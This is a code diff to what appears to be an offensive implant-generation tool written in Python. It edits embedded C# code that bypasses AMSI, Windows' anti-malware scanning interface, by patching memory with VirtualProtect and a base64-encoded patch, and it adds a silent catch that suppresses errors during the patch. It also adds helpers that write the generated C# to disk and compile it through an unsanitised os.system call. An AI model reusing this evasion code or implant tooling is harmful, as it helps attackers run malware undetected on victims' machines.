@@ -1,4 +1,5 @@
 import base64
+import os
 import subprocess
 
 # References:
@@ -34,8 +35,12 @@ AMSI_BYPASS_CODE = """
         if (!is64Bit())
             patch = Convert.FromBase64String("uFcAB4DCGAA=");
 
+      try{
         _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
         Marshal.Copy(patch, 0, asb, patch.Length);
+      } catch {
+        //silent continue
+      }
         VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
 
 """
@@ -589,6 +594,16 @@ class Implant:
   def compile(self):
     pass
 
+
+def cs_write(filename, code):
+   f = open(filename, "w")
+   f.write(code)
+   print("Wrote to: " + filename)
+   f.close()
+
+def cs_compile(filename, flags=""):
+  cmd = f"mcs {flags} {filename}"
+  os.system(cmd)
 
 # Other injection types
 #          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
